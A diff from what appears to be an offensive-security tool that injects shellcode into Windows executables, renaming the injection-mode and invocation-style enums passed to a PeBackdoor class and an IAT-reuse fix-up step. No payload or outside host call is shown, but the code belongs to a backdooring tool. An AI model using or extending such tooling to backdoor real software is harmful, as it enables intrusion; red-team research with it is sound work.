@@ -23,8 +23,8 @@ def inject_exe(
     shellcode_in = project.payload.payload_path
     exe_in = settings.inject_exe_in
     exe_out = settings.inject_exe_out
-    inject_mode: InjectStyle = settings.inject_mode
-    source_style: SourceStyle = settings.source_style
+    carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style
+    source_style: FunctionInvokeStyle = settings.source_style
 
     logger.info("--[ Injecting: {} + {} -> {}".format(
         shellcode_in, exe_in, exe_out
@@ -42,7 +42,7 @@ def inject_exe(
 
     # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
     superpe = SuperPe(exe_in)
-    peinj = PeBackdoor(superpe, main_shc, inject_mode)
+    peinj = PeBackdoor(superpe, main_shc, carrier_invoke_style)
 
     if not peinj.injectShellcode():
         logger.error('Could not inject shellcode into PE file!')
@@ -53,7 +53,7 @@ def inject_exe(
         return False
     
     logger.info("--[ Rewrite placeholders with their data")
-    if source_style == SourceStyle.iat_reuse:
+    if source_style == FunctionInvokeStyle.iat_reuse:
         injected_fix_iat(superpe, project.carrier, project.exe_host)
     
     if True:
